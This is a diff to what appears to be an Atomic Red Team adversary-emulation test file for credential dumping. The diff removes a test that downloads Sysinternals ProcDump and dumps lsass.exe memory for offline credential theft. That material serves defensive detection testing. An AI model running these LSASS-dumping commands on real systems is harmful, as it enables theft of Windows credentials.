@@ -39,42 +39,6 @@ atomic_tests:
       del %temp%\system >nul 2> nul
       del %temp%\security >nul 2> nul
 
-- name: Dump LSASS.exe Memory using ProcDump
-  description: |
-    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
-    ProcDump. The tool may be downloaded from https://docs.microsoft.com/en-us/sysinternals/downloads/procdump.
-  supported_platforms:
-    - windows
-
-  input_arguments:
-    output_file:
-      description: Path where resulting dump should be placed
-      type: Path
-      default: C:\Windows\Temp\lsass_dump.dmp
-    procdump_exe:
-      description: Path of Procdump executable
-      type: Path
-      default: PathToAtomicsFolder\T1003\bin\procdump.exe
-
-  dependency_executor_name: powershell
-  dependencies:
-    - description: |
-        ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})
-      prereq_command: |
-        if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
-        Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
-        New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
-        Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
-
-  executor:
-    elevation_required: true
-    name: command_prompt
-    command: |
-      #{procdump_exe} -accepteula -ma lsass.exe #{output_file}
-    cleanup_command: |
-      del "#{output_file}" >nul 2> nul
 
 - name: Dump LSASS.exe Memory using Windows Task Manager
   description: |
